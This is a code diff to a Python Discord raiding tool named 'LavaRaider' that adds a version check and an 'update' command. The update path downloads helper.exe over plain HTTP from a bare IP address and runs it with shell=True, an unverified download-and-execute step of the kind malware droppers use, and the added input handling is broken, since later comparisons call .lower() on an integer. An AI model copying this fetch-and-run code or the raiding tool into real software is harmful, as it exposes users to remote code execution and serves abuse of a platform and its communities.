@@ -21,8 +21,12 @@ import platform
 import socket
 import hwid
 import re
+import subprocess
+import urllib
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+LAVA_VERSION = '1.0.0'
 
 is_windows = False
 
@@ -252,7 +256,7 @@ if not os.path.exists('key') or open("key").read() == '':
                 headers = {
                     'Content-Type': 'application/json',  # Set Content-Type to application/json
                     'User-Agent': 'LavaRaider',
-                    'LavaVersion': '1.0'  # Replace with actual LavaVersion if needed
+                    'LavaVersion': LAVA_VERSION  # Replace with actual LavaVersion if needed
                 }
                 response = requests.post(WORKER_URL, data=json.dumps(data), headers=headers) # {"valid":true}
                 if response.json().get("valid") == True:
@@ -275,7 +279,7 @@ with open('key', 'r') as file:
     headers = {
         'Content-Type': 'application/json',  # Set Content-Type to application/json
         'User-Agent': 'LavaRaider',
-        'LavaVersion': '1.0'  # Replace with actual LavaVersion if needed
+        'LavaVersion': LAVA_VERSION   # Replace with actual LavaVersion if needed
     }
     response = requests.post(WORKER_URL, data=json.dumps(data), headers=headers) # {"valid":true}
     if response.json().get("valid") == True:
@@ -293,7 +297,7 @@ with open('key', 'r') as file:
                 headers = {
                     'Content-Type': 'application/json',  # Set Content-Type to application/json
                     'User-Agent': 'LavaRaider',
-                    'LavaVersion': '1.0'  # Replace with actual LavaVersion if needed
+                    'LavaVersion': LAVA_VERSION  # Replace with actual LavaVersion if needed
                 }
                 response = requests.post(WORKER_URL, data=json.dumps(data), headers=headers) # {"valid":true}
                 if response.json().get("valid") == True:
@@ -315,13 +319,23 @@ with open('key', 'r') as file:
 print(title)
 print(menu1)
 
+updateobj = requests.get('http://lavapi.hackysoft.xyz:8000/versions')
+newest_version = max(updateobj.json()["versions"], key=lambda v: list(map(int, v.split('.'))))
+
+if LAVA_VERSION != newest_version:
+    print(Style(CenterText(f'Update {newest_version} is available, type update to update.')))
+
 while True:
     try:
-        choice = int(input(f'\n' + Style('Your choice') + ' >> '))
-        if 1 <= choice <= 15:
+        choice = input(f'\n' + Style('Your choice') + ' >> ')
+        if choice != int and choice.lower() == 'update':
             break
         else:
-            print('Invalid choice. Please enter a number between 1 and 15.')
+            choice = int(choice)
+            if 1 <= choice <= 15:
+                break
+            else:
+                print('Invalid choice. Please enter a number between 1 and 15.')
     except ValueError:
         print('Invalid input. Please enter a number.')
 
@@ -333,7 +347,11 @@ def calculateNonce(date="now"):
         unixts = time.mktime(date.timetuple())
     return str((int(unixts)*1000-1420070400000)*4194304)
 
-if choice == '01' or choice == '1':
+if choice.lower() == 'update':
+    helper = urllib.request.urlretrieve('http://185.197.74.254:8000/versions/helper.exe', 'helper.exe')
+    subprocess.Popen(['helper.exe'], shell=True)
+    sys.exit(1)
+elif choice == '01' or choice == '1':
     clear()
     print(title)
     invite_code = input(Style('Invite Code') + ' >> ')
